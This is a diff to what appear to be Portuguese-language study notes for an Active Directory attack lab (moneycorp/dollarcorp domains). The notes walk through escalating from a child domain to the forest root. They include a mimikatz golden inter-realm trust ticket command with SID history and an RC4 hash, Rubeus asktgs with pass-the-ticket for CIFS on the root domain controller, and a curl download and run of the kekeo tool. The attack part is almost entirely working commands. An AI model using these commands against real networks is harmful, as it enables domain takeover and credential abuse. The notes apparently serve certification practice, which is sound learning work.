@@ -3089,4 +3089,17 @@ Exemplo: Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-70076742
 ```
 Kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e6b82e5d09e03817aab44dc809ded34a /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\trust_tkt.kirbi
 ```
-
+5. RUBEUS - SOLICITAR O TGS E IMPORTAR: (ESPECIFICAR O DC)
+```
+.\Rubeus.exe asktgs /ticket:C:\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+ou
+5. KEKEO OLD - SOLICITAR O TGS PARA SERVIÇO DO DOMAIN CONTROLLER (CIFS NO DOMAIN CONTROLLER)
+```
+curl http://172.16.99.209/oscp/crtp/kekeo_old.zip -Outfile kekeo_old.zip
+Expand-Archive .\kekeo_old.zip
+cd .\kekeo_old\
+```
+```
+.\asktgs.exe C:\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+```
